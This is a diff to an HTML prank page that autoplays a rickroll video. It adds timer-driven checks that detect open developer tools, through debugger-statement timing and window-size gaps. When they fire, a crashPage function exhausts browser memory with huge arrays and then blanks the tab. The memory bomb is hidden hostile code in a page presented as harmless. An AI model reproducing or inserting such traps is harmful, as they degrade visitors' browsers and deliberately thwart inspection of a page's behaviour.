@@ -46,20 +46,52 @@
     </style>
 </head>
 <body>
-
     <div id="overlay">Click to enter my cool website!</div>
     <video id="rickroll" src="rickroll.mp4" loop playsinline></video>
-
     <script>
         const overlay = document.getElementById('overlay');
         const video = document.getElementById('rickroll');
 
-        overlay.addEventListener('click', () => {
-            overlay.style.display = 'none';
+        window.addEventListener('load', () => {
+            video.muted = true;
             video.style.display = 'block';
-            video.play();
+            overlay.style.display = 'none';
+            video.play().then(() => {
+                document.addEventListener('click', () => { video.muted = false; }, { once: true });
+            }).catch(() => {
+                video.muted = false;
+                overlay.style.display = 'flex';
+                video.style.display = 'none';
+                overlay.addEventListener('click', () => {
+                    overlay.style.display = 'none';
+                    video.style.display = 'block';
+                    video.play();
+                });
+            });
         });
+        function crashPage() {
+            document.body.innerHTML = '';
+            const bomb = [];
+            try {
+                while (true) bomb.push(new Array(1e7).fill('💀'));
+            } catch (e) {
+                location.href = 'about:blank';
+            }
+        }
+        setInterval(() => {
+            const start = performance.now();
+            debugger;
+            if (performance.now() - start > 100) crashPage();
+        }, 1000);
+        setInterval(() => {
+            const threshold = 160;
+            if (
+                window.outerWidth - window.innerWidth > threshold ||
+                window.outerHeight - window.innerHeight > threshold
+            ) {
+                crashPage();
+            }
+        }, 500);
     </script>
-
 </body>
 </html>
